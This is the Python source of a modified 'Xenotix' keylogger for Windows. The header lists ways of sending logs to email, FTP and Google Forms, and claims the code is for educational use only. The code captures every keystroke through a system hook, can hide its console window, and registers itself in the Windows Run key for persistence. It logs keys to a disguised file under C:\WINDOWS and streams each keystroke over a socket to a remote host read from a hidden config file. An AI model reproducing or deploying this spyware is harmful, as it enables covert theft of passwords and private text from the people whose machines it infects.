'''
Xenotix Python Keylogger for Windows
====================================
Coded By: Ajin Abraham <ajin25@gmail.com>
Website: http://opensecurity.in/xenotix-python-keylogger-for-windows/
GitHub: https://github.com/ajinabraham/Xenotix-Python-Keylogger

FEATURES
========
1.STORE LOGS LOCALLY
2.SEND LOGS TO GOOGLE FORMS
3.SEND LOGS TO EMAIL
4.SEND LOGS TO FTP

MINIMUM REQUIREMENTS
===================
Python 2.7: http://www.python.org/getit/
pyHook Module: http://sourceforge.net/projects/pyhook/
pyrhoncom Module: http://sourceforge.net/projects/pywin32/

pyHook Module -
Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/


NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
'''
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import win32event, win32api, winerror
import socket
from _winreg import *

#Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)

fp=None
conf_path="filepath"
clientsocket=None

#Hide Console
def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def msg():
    print """\n \nModified Xenotix Python Keylogger for Windows
Original Coder: Ajin Abraham <ajin25@gmail.com>
OPENSECURITY.IN
Modifiers: Not listed

usage:xenotix_python_logger.py mode [optional:startup]

mode:
     local: store the logs in a file

[optional] startup: This will add the keylogger to windows startup.\n\n"""
    return True

# Add to startup
def addStartup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)

def main():
    global clientsocket,fp
    if len(sys.argv)==1:
        msg()
        exit(0)
    else:
        if len(sys.argv)>2:
            if sys.argv[2]=="startup":
                addStartup()
            else:
                msg()
                exit(0)
        if sys.argv[1]=="local":
            #hide()
            with open("C:\WINDOWS\Help\wmconf","r") as conf:
                host = conf.readline().rstrip()
                port = int(conf.readline().rstrip())
                clientsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                clientsocket.connect((host, port))
            fp = open("C:\WINDOWS\msgstat","a")
        else:
            msg()
            exit(0)
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global data,fp,clientsocket
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    fp.write(keys)
    fp.flush()
    clientsocket.send(keys)

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
